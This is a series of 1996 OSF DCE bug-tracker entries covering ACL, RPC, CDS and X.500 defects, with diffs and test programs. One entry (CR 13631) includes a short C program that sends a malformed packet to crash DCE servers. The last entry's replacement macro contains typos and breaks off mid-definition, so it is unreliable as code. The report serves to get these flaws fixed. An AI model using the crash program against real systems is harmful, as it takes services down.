Reported Date                 : 9/27/96
Found in Baseline             : 1.1
Found Date                    : 9/27/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/dce/utils/acldb/aclimpl.c
Diff supplied by              : provider
Diff release                  : 1.2
Sensitivity                   : public

[9/27/96 public]

dce_rdacl_get_access() passes in the PAC's user and group as the owner and
group_obj-owner to dce_acl_inq_permset_for_creds(), along with the cred_h.
This is *wrong*, because dce_acl__permset_alg() below these calls is expecting
those args to be the owning user_obj and group_obj uuids of the object that
the ACL is protecting, and will be comparing them against the user and group
it gets from the cred_h passed in (in other words, it's now comparing them
against themselves, which will always return true).

For now, since the DCE ACL library can't possibly support user_obj and group_obj
(see the next OT, I'll be opening in a few minutes), dce_rdacl_get_access()
should just pass NULL for these two arguments, so that if a user_obj or
group_obj entry exists (via the other bug), it'll just get an error from this
call rather than an incorrect result.

[10/14/96 public]
Here are the diffs for the fix based on the HP DCE product release,
so they may not match line number for line number with the 1.2 release.
Again, note that these diffs will yield an error from this call rather
than an incorrect result. The underlying problem (that the DCE ACL library
doesn't support user_obj and group_obj ACL entries) is not fixed by
these diffs.

*** aclimpl.c#1 Thu Oct 10 16:58:55 1996
--- aclimpl.c   Thu Oct 10 17:30:18 1996
***************
*** 492,500 ****
      rpc_authz_cred_handle_t   cred_h;
      acl_mgt_t                 *am_info;
      sec_acl_result_t          result;
!     sec_cred_pa_handle_t      *cred_pa;
!     sec_id_pa_t                       *pa_p;
!
      *st = error_status_ok;
      *net_rights = dce_acl_c_no_permissions;   /* default perms - none */

--- 495,501 ----
      rpc_authz_cred_handle_t   cred_h;
      acl_mgt_t                 *am_info;
      sec_acl_result_t          result;
!
      *st = error_status_ok;
      *net_rights = dce_acl_c_no_permissions;   /* default perms - none */

***************
*** 515,532 ****
        UNLOCK;
        return;
      }
!
!     /* Find who the caller is - we need the prin/group in case there are
!      * user_obj and group_obj ACLEs */
!     cred_pa = sec_cred_get_initiator(cred_h, st);
!     STAT_CHECK_RET_UNLOCK(*st);
!     pa_p = sec_cred_get_pa_data(cred_pa, st);
!     STAT_CHECK_RET_UNLOCK(*st);
!
      /* Compare ACL with PAC, determining permissions. */
      dce_acl_inq_permset_for_creds(cred_h,
!           result.tagged_union.sec_acl_list->sec_acls[0],
!           &pa_p->principal.uuid, &pa_p->group.uuid,
            sec_acl_posix_no_semantics, net_rights, st);
      STAT_CHECK_RET_UNLOCK(*st);

--- 516,525 ----
        UNLOCK;
        return;
      }
!
      /* Compare ACL with PAC, determining permissions. */
      dce_acl_inq_permset_for_creds(cred_h,
!           result.tagged_union.sec_acl_list->sec_acls[0],NULL,NULL,
            sec_acl_posix_no_semantics, net_rights, st);
      STAT_CHECK_RET_UNLOCK(*st);



CR Number                     : 13634
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : unique ptr causes exceptionf
Reported Date                 : 9/27/96
Found in Baseline             : 1.1
Found Date                    : 9/27/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/27/96 public]

Marco Lara at OEC reports this bug with unique pointers.

===============================================================
README
===============================================================

This example illustrates what seems to be a DCE error handling "unique"
pointers.  The enclosed IDL contains four opertaions: ok1, ok2, bad1 and bad2.
n
The simple client and server run operations "ok1" and "ok2" successfully,
but using the client to call "bad1" or "bad2" raises the exception
"16c9a103 (hex): Stub or runtime protocol error (dce / rpc)"
in the client stub api "rpc_ss_ndr_unmar_interp()".

Tests "bad1" and "bad2" fail, although the NDR buffers being passed over
the wire look correct.

Fruthermore, if the client is recompiled as a Microsoft RPC client on
Windows NT, all tests pass successfully.


This test fails when the client is run on the following platforms:

solaris  2.5  using OSF DCE 1.1
hpux    10.01 using OSF DCE 1.1
aix      4.1  using OSF DCE 1.1

the test succeeds running the client on:

windows NT 4.0 using included MSRPC



To run the test:

         #  build client and server
gmake    #  (GNU make)

sample&  #  run server


client ok1   # test operation "ok1", should succeed
client ok2   # test operation "ok2", should succeed
client bad1  # test operation "bad1", should fail rasing exception
client bad2  # test operation "bad2", should fail rasing exception

===============================================================
Makefile
===============================================================

MACHINE_FLAGS = -D_HPUX_SOURCE 
IDL =  idl -keep c_source -I.
SYS_LIBS = -ldce -lm -lc_r
CC = c89 +w1 -g 

SSRCS = sample.o sample_sstub.o samplesm.o
CSRCS = client.o sample_cstub.o
SOBJS = $(SSRCS:.c=.o)
COBJS = $(CSRCS:.c=.o)

all: sample client

.c.o:
	$(CC) -c $< $(MACHINE_FLAGS) -I.
 
sample: $(SOBJS)
	$(CC) $(LDFLAGS) -o sample -z -Wl,-Bimmediate,-Bnonfatal,-a,default,-E,+b,/lib:/usr/lib $(SOBJS) $(SYS_LIBS)

client: $(COBJS)
	$(CC) $(LDFLAGS) -o client -z -Wl,-Bimmediate,-Bnonfatal,-a,default,-E,+b,/lib:/usr/lib $(COBJS) $(SYS_LIBS)

sample.h sample_cstub.c sample_sstub.c: sample.idl sample.acf
	$(IDL) sample.idl

clean:
	rm -f *.o *_[cs]stub.c client sample sample.h core

client.o: sample.h
sample.o: sample.h
sunhsm.o: sample.h

===============================================================
sample.idl
===============================================================
 
[version(2.6)]
interface sample
{

#	ifdef WIN32
		typedef unsigned long  unsigned32;
		typedef          short signed16;
#	endif

	typedef [string, unique]    char*           tStr;
	typedef struct 
	{
                            	unsigned32      Size;
    	[unique, size_is(Size)] tStr*           Array;
	} tArray;

	typedef [string, ptr]       char*           tPtrStr;
	typedef struct 
	{
                            	unsigned32      Size;
    	[ptr, size_is(Size)]    tPtrStr*        Array;
	} tPtrArray;

	void ok1
	( 
		[in] handle_t           h,
		[out] tArray*           pData
	);

	signed16 ok2
	( 
		[in] handle_t           h,
		[out] tPtrArray*        pData
	);

	signed16 bad1
	( 
		[in] handle_t           h,
		[out] tArray*           pData
	);

	void bad2
	( 
		[in] handle_t           h,
		[out] tArray*           pData,
		[out] signed16*         j
	);
}

===============================================================
sample.acf
===============================================================

interface sample
{
[enable_allocate] ok1();
[enable_allocate] ok2();
[enable_allocate] bad1();
[enable_allocate] bad2();
}

===============================================================
client.c
===============================================================

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#ifndef WIN32
#	include <dce/rpc.h>
#else
#	include <rpc.h>
#	include "dceport.h"
#endif
#include "sample.h"

main(int argc, char **argv)
{
	tArray   Data;
	signed16 Result;
	int      i;
	unsigned32  j;
	handle_t    h;
	error_status_t st;
	signed16    m;

	rpc_binding_from_string_binding ((idl_char*)"ncacn_ip_tcp:localhost",
		&h, &st);
	assert (st == error_status_ok);

	for (i = 1; i < argc; i++)
	{
		memset (&Data, 0, sizeof (tArray));
		printf ("running <%s>\n", argv[i]);
		if (!strcmp (argv[i], "ok1"))
		{
			ok1 (h, &Data);
		}
		else if (!strcmp (argv[i], "ok2"))
		{
			Result = ok2 (h, (tPtrArray*)&Data);
			printf ("Result = %hu\n", Result);
		}
		else if (!strcmp (argv[i], "bad1"))
		{
			Result = bad1 (h, &Data);
			printf ("Result = %hu\n", Result);
		}
		else if (!strcmp (argv[i], "bad2"))
		{
			bad2 (h, &Data, &m);
		}
		printf ("Data = %lu\n", Data.Size);
		for (j = 0; j < Data.Size; j++)
		{
			if (Data.Array[j])
			{
				printf ("\t<%s>\n", Data.Array[j]);
			}
			else
			{
				printf ("\t<NULL>\n");
			}
		}
	}
	return 0;
}

===============================================================
sample.c
===============================================================
#include <stdio.h>

#ifndef WIN32
#	include <dce/rpc.h>
#else
#	include <rpc.h>
#	include "dceport.h"
#endif
#include "sample.h"

static void GetData
(
	tArray*       pData
)
{
	error_status_t St;

	pData->Array = rpc_sm_allocate (2 * sizeof (tStr), &St);
	pData->Size = 2;
	pData->Array[0] = rpc_sm_allocate (6, &St);
	pData->Array[1] = NULL;
	strcpy (pData->Array[0], "hello");
}

void ok1
(
	handle_t       h,
	tArray*        pData
)
{
	GetData(pData);
}

signed16 ok2
(
	handle_t       h,
	tPtrArray*     pData
)
{
	GetData((tArray*)pData);
	return 1;
}

signed16 bad1
(
	handle_t       h,
	tArray*        pData
)
{
	GetData(pData);
	return 1;
}

void bad2
(
	handle_t       h,
	tArray*        pData,
	signed16*      j
)
{
	GetData(pData);
	*j = 2;
}

===============================================================
samplesm.c
===============================================================

#include <stdio.h>
#include <assert.h>

#ifndef WIN32
#	include <dce/rpc.h>
#else
#	include <rpc.h>
#endif

#include "sample.h"


int main (int argc, char** argv)
{
	error_status_t st;
	rpc_binding_vector_t* bvec;

	rpc_server_register_if (sample_v2_6_s_ifspec, NULL, NULL, &st);
	assert (st == error_status_ok);

	rpc_server_use_all_protseqs (5,  &st);
	assert (st == error_status_ok);

	rpc_server_inq_bindings (&bvec, &st);
	assert (st == error_status_ok);

	rpc_ep_register (sample_v2_6_s_ifspec, bvec, NULL, NULL, &st);
	assert (st == error_status_ok);

	rpc_server_listen (5, &st);
	assert (st == error_status_ok);

	return 0;
}



CR Number                     : 13633
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : error msg catalog
Short Description             : Wrong explanation for two acl err msgs
Reported Date                 : 9/27/96
Found in Baseline             : 1.1
Found Date                    : 9/27/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/security/idl/sec.sams
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/27/96 public]

The following explanations and actions are wrong (backwards).  The error
occurs when an ACL manager finds a user_obj or group_obj entry, but cannot
determine who the owner is (was not passed the correct information), and thus
cannot determine whether the acl entry applies to this caller or not.  I
can't come up with a great explanation at this time, but something more like:
ACL contains a user_obj entry, but owner cannot be determined
would be closer to reality.  The only action that makes sense in this case is
to log a bug against the ACL manager that caused this problem and get it fixed.
ACL managers that allow user_obj or group_obj entries to be set on ACLs that
they control, must also provide owner information for each ACL evaluation call.
If they cannot, then they should reject user_obj and group_obj entries on
rdacl_replace calls with the error: sec_acl_invalid_entry_type
(unfortunately, this can't tell the caller which entry type was bad;  With
almost 20-20 hindsight, I can say we should have provided feedback in one of
the pre-calls (sec_acl_get_manager_types()?) that specified what ACL entry types
the manager supported).

start
code    sec_acl_expected_user_obj
text    "acl operation expected user_obj"
explanation    "Object has an owner but no user_obj entry contained in its ACL."
action         "Add a user_obj entry to the ACL, then retry the operation."
end

start
code    sec_acl_expected_group_obj
text    "acl operation expected group_obj"
explanation    "Object has an owning group but no group_obj entry in its ACL."
action         "Add a group_obj entry to the ACL, then retry the operation."
end



CR Number                     : 13631
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13489
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : server-runtime
Short Description             : bad packets crash a server
Reported Date                 : 9/25/96
Found in Baseline             : 1.2.1
Found Date                    : 9/25/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/25/96 public]

Lexis-Nexis has a small program that will crash any DCE server.
I have no idea what priority to give this bug.  If you add additional
information to this OT, please note the non-project people on the Cc list.
I am also reporting this against 1.2.1 as I believe that is the basis
for the HP 1.1 product.

>    Here is the stack trace from running the client against dtsd
>on an HP (HP/UX 9.0.4 DCE 1.1):
>
>Target process died because of: SIGSEGV - segmentation violation.
>Executing image in process 2394: "/opt/dcelocal2/dcelocal/bin/dtsd".
>Stopped at: `va(40066f78) (40066F78) (`thread(22))
> 
>Thread 22 rpc__cn_network_receiver  RUNNING 
>`thread(22)\`main:  Stopped at: `va(40066f78) (40066F78)

Here is the code.

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stream.h>
#include <ctype.h>
 
 
main(int argc, char **argv)
{
   int i,j, sockfd, ntimes = 1;
   int result, serverLen;
   struct sockaddr_in serv_addr;
   struct sockaddr* serverSockAddrPtr;
   char SERV_HOST_ADDR[24];
   int portnum;
   char inbuf[80];
   char outbuf[8192];
   short int filler = 0x01;
   short int major_minor;
   short int fsize = 4096;
 
   memset((char *) &serv_addr, 0 , sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_addr.s_addr = inet_addr(SERV_HOST_ADDR);
   cout << "Enter Host: ";
   cin >> SERV_HOST_ADDR;
   cout << "Enter Port Number: ";
   cin >> portnum;
   serv_addr.sin_addr.s_addr = inet_addr(SERV_HOST_ADDR);
   serv_addr.sin_port = htons(portnum);
   serverSockAddrPtr = (struct sockaddr*) &serv_addr;
   serverLen = sizeof (serv_addr);
 
   major_minor = (0x05 << 8)  + 0x00;
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        cout << "clientsoc: can't open stream socket";
        exit(0);
     }
   do {
   result = connect(sockfd,serverSockAddrPtr,serverLen);
   if (result == -1) sleep(1);
   } while (result == -1);
 
   // kill the server
 
   write (sockfd,&major_minor,2);
   write (sockfd,&filler,2);
   write (sockfd,&fsize,2);
   memset( outbuf, '\0', 8192);
   write (sockfd,outbuf,8192);
 
   // reads not needed - only provide timing clue to client
   read (sockfd,inbuf,80);
   cout << inbuf << endl;
   close(sockfd);
   exit(0);
}

[09/26/96 public]

I opened OT 13489 when a support customer reported that bad packets 
crashed any server exporting ncadg except rpcd and dced. 

It looks like these are dup's. For now I am entering them in each other's 
inter-dependent fields.



CR Number                     : 13629
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : unknown
Subcomponent Name             : unknown
Short Description             : test
Reported Date                 : 9/18/96
Found in Baseline             : 1.1
Found Date                    : 9/18/96
Severity                      : A
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/18/96 public]



CR Number                     : 13628
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : Add trademark for DFS
Reported Date                 : 9/18/96
Found in Baseline             : 1.2.1
Found Date                    : 9/18/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : /src/dcebooks/include/copyright.gpsml
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/19/96 public]
Change copyright page to include trademark for DFS.



CR Number                     : 13621
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : adver
Short Description             : client configure into long cellname fails to create default acl
Reported Date                 : 8/26/96
Found in Baseline             : 1.2.2b3
Found Date                    : 8/26/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : directory/cds/adver/adver_dacl.c
					     directory/cds/gda/gda_dacl.c
					     directory/cds/server/cds_dacl.c
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : public

[8/26/96 public]

This was found during internal testing.  The cellname was 126 characters
long, and during CDS client configuration, you would get:

    Configuring CDS client
        Creating the cds.conf file
        Starting CDS advertiser daemon (cdsadv)...
1996-02-26-15:08:12.563-05:00I429.746 cdsadv(3634) ERROR cds general adver_dacl
sec_id_parse_name returned status 387063930 to general :
1996-02-26-15:08:12.567-05:00I429.746 cdsadv(3634) WARNING cds general adver_da
Unable to create default acl: status = 387063930.
1996-02-26-15:08:12.570-05:00I429.746 cdsadv(3634) WARNING cds general adver_da
Unable to create default acl: status = 0.

Upon investigation, certain buffers within CDS were only taking into account
100 bytes for some unknown reason.  I've increased them to SIMPLENAMEMAX
(= 255), which is the maximum for a CDS simple name.  The changes affect
the following images:

cdsadv	adver_dacl.c
gdad	gda_dacl.c
cdsd	cds_dacl.c

While this fix should get into R1.2.2 core, here's what to look for.
In adver_dacl.c, increase the buffer size from:

char Clerk_Realm[100];     /* Our Cell       */
uuid_t Clerk_Realm_uuid;   /* Our CEll UUID */
char HostPrincipal[100];   /* host (machine) principal name */
uuid_t HostPrincipal_uuid; /* host (machine) principal uuid */
char AdminGroup[100];      /* cds-admin group name          */

To:

char Clerk_Realm[SIMPLENAMEMAX+1];     /* Our Cell       */
uuid_t Clerk_Realm_uuid;	       /* Our CEll UUID */
char HostPrincipal[SIMPLENAMEMAX+1];   /* host (machine) principal name */
uuid_t HostPrincipal_uuid;	       /* host (machine) principal uuid */
char AdminGroup[SIMPLENAMEMAX+1];      /* cds-admin group name          */

Similar statements exist in gda_dacl.c and cds_dacl.c.

[12/6/96 public]
Updated the Diff header fields.  Unfortunately, this edit didn't get
into R1.2.2 because of scheduling difficulties.



CR Number                     : 13620
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13665
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : xds
Short Description             : can't read attr-value of cdsroot
Reported Date                 : 8/26/96
Found in Baseline             : 1.2
Found Date                    : 8/26/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[girkar 8/26/96] 
This is a problem we found with R1.2.2_b3 on the reference platform (AIX)
with the x500 API when the back-end is CDS. Calls such as ds_read()
in this case fail on a X500 entry that points to CDS root directory.
Thus, the effect is that no attribute-value of the CDS root directory
can be obtained using the ds_read() api even if we specify a specific
attribute lookup in the ds_read() call.

A further problem we noticed is that ds_read() fails on all directory
entries of CDS when we specify within ds_read that all attribute-value
pairs need to be returned.

A closer inspection of these two problems seem to be in the 
src/directory/gds/dua/switch layer. We have some workarounds, but
these don't necessarily solve these two problems cleanly. The worarounds
have to do with changing the directory/gds/dua/switch modules to 
do some "extra" error checking when calls are made to internal
cds API.

Mahesh Girkar
girkar@tuxedo.lkg.dec.com

[8/27/96]

Below are diffs of 4 files 
(d21_cdsrd.c, d21_cdsmis.c, d21_cdsadd.c & d21_cdsmod.c)
that I modified in src/directory/gds/dua/switch
to get around the problem of reading cds root directory via x500 ds_read
API, as well as reading other directory entries via the ds_read API
(when you specify all attr/values to read). I also ended up fixing
another weird restricton, where you could all attr/value pairs to 
any directory other than root directory. Basically, as it was implemented
on the reference platform, one could write attr/values to any directory
other than root.  

    Here are the problems once again:

     1. Cannot read attr-values of cds root. You cannot do this
        even if you specify specific attr types in ds_read.

        Fix is in d21_cdsrd.c

        This  is clearly a bug.

     2. Cannot read "all" attr-values using ds_read() on any 
        directory. You can, however, read specific attribute
        types provided these are cds attributes that are being
        translated in function d21_cdsval2x500val.

        Fix is in d21_cdsmis.c

        This, I believe is also a bug. I cannot however think
        of a clean way of implementing this, as we can either
        ignore cds attributes that do not have x500 equivalent
        attributes, or just read these cds attributes as bytes
        (if no conversion routine exists for these values).

     3. Cannot add attr/values to root directory.

        Fix is in d21_cdsadd.c & d21_cdsmod.c

        This may or may not be a bug, depending upon whether this is 
        a restriction documented in x500. In any case, if we cannot
        add attr-values to root directory, we should not be able
        to add attr-values to any directory. It does not make sense
        to exclude the root directory.



The diffs are for files  d21_cdsadd.c, d21_cdsmis.c, d21_cdsmod.c &
d21_cdsrd.c  (diff <original-R1.2.2._b3 file> <modified-file>)

========
d21_cdsrd.c
=========

647c647,648
< 		if (flags->fsLocStat == DNS_UNKNOWNENTRY) {
---
>                 /* mbg: DEC fix.. really, fsLocStat can be DNS_ROOTLOST.. */
> 		if ((r_code != DNS_SUCCESS) || (flags->fsLocStat == DNS_UNKNOWNENTRY)) {
1410c1411,1412
< 		if (flags->fsLocStat == DNS_UNKNOWNENTRY) {
---
> 																			  /* mbg: DEC fix */
> 		if (r_code != DNS_SUCCESS || flags->fsLocStat == DNS_UNKNOWNENTRY) {
1416a1419,1421
>                       
>                         /* mbg: decfix */
>                         cdsClearHandle(handle);
1417a1423
>                         /* mbg: decfix */
1420c1426
< 				(void *)NULL, (int *)NULL, flags)) == DNS_ERROR) {
---
> 				(void *)NULL, (int *)NULL, flags)) != DNS_SUCCESS) {



=============
d21_cdsmis.c
============

248c248,254
< 	if (dns_value->val_syntax == dns_char) {
---
> /* mbg: DEC fix */
>         if (dns_value->val_syntax == dns_Timeout) {
>           len = sizeof (cds_timeout_t);
>           if ((str_value = D27_MALLOC(svc_c_sev_warning,len)) == NULL) {
> 			return (D2_ERROR);
> 		}
>         } else if (dns_value->val_syntax == dns_char) {
255c261,270
<     } else if (dns_value->val_syntax == dns_byte) {
---
>     /* mbg: DEC fix */
>     } else if (dns_value->val_syntax == dns_byte ||
>                dns_value->val_syntax == dns_ReplicaPointer ||
>                dns_value->val_syntax == dns_GroupMember ||
>                dns_value->val_syntax == dns_FullName ||
>                dns_value->val_syntax == dns_ParentPointer ||
>                dns_value->val_syntax == dns_CHDirectory ||
>                dns_value->val_syntax == dns_ASN1 ||
>                dns_value->val_syntax == dns_gdaPointer
>               ) {
298a314
>     /* mbg: DEC fix */
299a316,322
>                 case dns_ReplicaPointer:
>                 case dns_GroupMember:
>                 case dns_FullName:
>                 case dns_ParentPointer:
>                 case dns_CHDirectory:
>                 case dns_ASN1:
>                 case dns_gdaPointer:
303c326,327
< 			strncpy ((char *)oct_value, dns_value->val_u.val_byte.byte_p, len);
---
>         /* mbg: DEC fix */
> 			memcpy ((char *)oct_value, dns_value->val_u.val_byte.byte_p, len);
305a330,338
> 
>           /* mbg DEC fix */
>                 case dns_Timeout:
> 			value_union->d2_a_rep = D2_OCTET;
> 			value_union->d2_a_v_len = len;
> 			memcpy ((char *)oct_value, (char *) &dns_value->val_u.val_timeout, len);
> 			value_union->d2_at_value.d2_oct_a_v = oct_value;
> 			break;
> 
331a365,379
> 
>                  /* mbg: DEC FIX */
> 		case dns_small:
> 
> 			value_union->d2_a_rep = D2_INTEGER;
> 			value_union->d2_at_value.d2_int_a_v = (signed32) dns_value->val_u.val_small;
> 			break;
> 
> 		case dns_short:
> 
> 			value_union->d2_a_rep = D2_INTEGER;
> 			value_union->d2_at_value.d2_int_a_v = (signed32) dns_value->val_u.val_short;
> 			break;
> 
> 



================
d21_cdsadd.c
===============

543a544,546
> 
> 
> /* mbg DEC fix */
545c548
< 					&dns_value, NULL_DNS_CTS, flags) == DNS_ERROR) {
---
> 					&dns_value, NULL_DNS_CTS, flags) != DNS_SUCCESS) {
652a656
> 																		/* mbg: DEC fix */
654c658
< 							&dns_value, NULL_DNS_CTS, flags) == DNS_ERROR) {
---
> 							&dns_value, NULL_DNS_CTS, flags) != DNS_SUCCESS) {
744a749
> 			/* mbg: DEC fix */
746c751
< 				== DNS_ERROR) {
---
> 				!= DNS_SUCCESS) {

===========
d21_cdsmod.c
=========

505c505,506
< 			if (flags->fsLocStat == DNS_UNKNOWNENTRY) {
---
> 			/* mbg: DEC fix */
> 			if ((r_code != DNS_SUCCESS) || (flags->fsLocStat == DNS_UNKNOWNENTRY)) {
510c511,512
< 			if (r_code == DNS_ERROR) {
---
> 			/* mbg: DEC fix */
> 			if (r_code != DNS_SUCCESS) {
511a514
> 
818a822
> 				/* mbg: DEC fix */
820c824
<                 	== DNS_ERROR) {
---
>                 	!= DNS_SUCCESS) {

[girkar 11/13/96] 

Added Cross-reference to OT 13665. OT 13665 contains minimal changes
needed to run Certification API tests. Also, down graded priority
of this OT to C,3.



CR Number                     : 13619
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : nbase.idl dependency problems
Reported Date                 : 8/26/96
Found in Baseline             : 1.2.2
Found Date                    : 8/26/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/26/96 public]
There a small flurry of mail about nbase.idl a while back, but nothing
came of it. Here is the relavant bit of info:

>We have been experiencing a problem with nbase.idl. It doesn't show up in
>a ClearCase clearmake build because clearmake winks the darn thing in from
>a previous build. It is just too helpful. ;-) Anyway, nbase.idl is needed in:
>
>
>[ /dce/utils/svc ]
>rm -rf service.h
>/project/dce/build/dce1.2.2_recycle/tools/rios/bin/idl      -no_mepv -keep c_sou
>rce   -I/project/dce/build/dce1.2.2_recycle/export/rios/usr/include -I/project/d
>ce/build/dce1.2.2_recycle/external/rios/usr/include -client none -server none /u
>2/build/dce1.2.2_recycle/src/dce/utils/svc/service.idl
>/project/dce/build/dce1.2.2_recycle/tools/rios/bin/idl: File /u2/build/dce1.2.2_
>recycle/src/dce/utils/svc/service.idl, line 1
>File dce/nbase.idl not found
>Compilation aborted
>*** Error code 3
>
>but it is not built made available until:
>
>[ /rpc/sys_idl ]
>(cd /u2/build/dce1.2.2_recycle/src/rpc/sys_idl; ln -s `pwd`/nbase.idl
> /project/dce/build/dce1.2.2_recycle/export/rios/usr/include/dce/nbase.idl)
>
>which is kind of strange because that implies it already exists in the export
>tree.



CR Number                     : 13617
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Unexpected exception was raised
Reported Date                 : 8/25/96
Found in Baseline             : 1.1
Found Date                    : 8/25/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnclsm.h
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/25/96 public]

The test was terminated due to the following error:        
PID#145 rpc recv d:\U\BUILD\BUILD\SRC\RUNTIME\CNRCVR.C 466 0ax010a5010 msgID=
0x16C9A15C
[rpc__cn_network_receiver] Unexpected exception was raised


------------------------------------------------------------------------
The problem is the state machine does not realize the call rep could be
freed in stop_orphan_action_rtn.  Once the call rep is freed the state 
machine is also freed.  In rpc__cn_sm_eval_event, the state machine
control block is actually prt of the call rep memory space, therefore,
any state machine reference is actually refering to the call rep memory
space.  If the call rep is freed [in this case rpc__cn_call_end]
rpc__cn_sm_eval_event continued to use the free space of the call rep.
The trap occurs since rpc__cn_sm_eval_event checks for to determine
whether additonal events [more_events] need to be processed.
Therefore, rpc__cn_sm_eval_event will try to process the next action
using the newly freed space which will cause the resulting trap.
-------------------------------------------------------------------------
This can be fixed by copying the state machine into a local memeory and pass the replicated state into the state machine engine.
-----------------------------------------------------------------------------
Replace the definition for RPC_CN_POST_CALL_SM_EVENT in cnclsm.h with
the following:
#define RPC_CN_POST_CALL_SM_EVENT(assoc, eventid, fragbuf, st) \
{ \
    rpc_cn_call_rep_p_t crep; \
    rpc_cn_sm_ctlblk_t crep_state; \
    unsigned i; \
\
    crep = RPC_CN_ASSOC_CALL (assoc); \
    if (crep != NULL) \
    { \
        if (RPC_CN_PKT_CALL_ID ((rpc_cn_packet_p_t) RPC_CN_CREP_SEND_HDR (crep)) \
            == \
            RPC_CN_PKT_CALL_ID (RPC_CN_FRAGBUF_PKT_HDR (fragbuf))) \
        { \
            RPC_CN_CALL_SM_TRC (crep, eventid, (RPC_CN_PKT_CALL_ID ((rpc_cn_packet_p_t) RPC_CN_CREP_SEND_HDR (crep))));\
\
            if ((assoc->assoc_flags & RPC_C_CN_ASSOC_SERVER) &&  \
                (eventid == RPC_C_CALL_ORPHANED)) \
            { \
                crep_state.state_tbl = crep->call_state.state_tbl; \
                crep_state.action_tbl = crep->call_state.action_tbl; \
                crep_state.cur_state = crep->call_state.cur_state; \
                crep_state.cur_event = crep->call_state.cur_event; \
                crep_state.action_status = crep->call_state.action_status; \
                crep_state.event_list_hindex = crep->call_state.event_list_hindx; \
                crep_state.event_list_tindex = crep->call_state.event_list_tindx; \
                crep_state.event_list_state = crep->call_state.event_list_state \
                crep_state.tbl_id = crep->call_state.tbl_id; \
\
                for (i=0;i<RPC_C_CN_SM_EVENT_LIST_MAX_ENTRIES;i++) \
                        { \
                            crep_state.event_list[i].event_id = crep->call_stat.event_list[i].event_id; \
                            crep_state.event_list[i].event_param = crep->call_sate.event_list[i].event_param; \
                        } \
\                                                                               
                crep->call_state.cur_event = RPC_C_SERVER_CALL_CALL_COMPLETED; c ep->call_state.action_status = rpc_s_ok; \
\
                st = rpc__cn_sm_eval_event (eventid, (pointer_t) fragbuf, \
                     (pointer_t) crep, &(crep_state)); \
            } \
           else \
            { \
                st = rpc__cn_sm_eval_event (eventid, (pointer_t) fragbuf, \
                     (pointer_t) crep, &(crep->call_state)); \
            } \
